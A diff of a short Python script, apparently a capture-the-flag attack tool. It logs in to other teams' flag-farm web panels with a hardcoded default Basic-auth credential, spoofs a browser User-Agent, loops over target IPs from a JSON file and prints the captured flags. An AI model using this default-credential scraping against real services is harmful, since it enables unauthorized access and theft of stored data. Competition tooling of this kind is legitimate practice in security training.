@@ -1,33 +1,44 @@
 #!/usr/bin/env python3
 import requests
 import json
-from ips import ips
 
-def connect(addr,page):
-    headers = {'Authorization' : 'Basic OjEyMzQ='}
-    data =  {"sploit":"","team":"","flag":"","time-since":"","time-until":"","status":"ACCEPTED","checksystem_response":"", "page-number":f"{page}",'Authorization' : 'Basic OjEyMzQ='}
-
+def get_flags(ip, page):
+    headers = {
+        'Authorization': 'Basic OjEyMzQ=',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
+    }
+    data = {
+        "sploit": "",
+        "team": "",
+        "flag": "",
+        "time-since": "",
+        "time-until": "",
+        "status": "ACCEPTED",
+        "checksystem_response": "",
+        "page-number": str(page),
+    }
     try:
-        r = requests.post(addr,headers=headers,data=data,timeout=5)
-    except:
+        r = requests.post(f'http://{ip}:5000/ui/show_flags', headers=headers, data=data, timeout=5)
+    except Exception:
         return False
 
-    parsed = json.loads(r.text)["rows"]
-    if parsed:
-        for res in parsed:
-                print(res["flag"])
-        return True
-
-    return False
-
-if ips != {}:
-    for ip in ips:
-        page = 1
-        addr = f"http://{ip}:5000/ui/show_flags"
-
-        while connect(addr,page) and page <= 3:
-            page+=1
-else:
-    print("No vulnerable farms found")
+    rows = r.json().get('rows', [])
+    for row in rows:
+        print(row.get('flag'), flush=True)
+    return bool(rows)
 
 
+if __name__ == '__main__':
+    try:
+        with open('ip.json', 'rt') as f:
+            ips = json.load(f)
+    except Exception:
+        print('no ip.json found', flush=True)
+        exit(1)
+
+    for ip, status in ips.items():
+        if status != 200:
+            continue
+        for page in range(1, 3 + 1):
+            if not get_flags(ip, page):
+                break
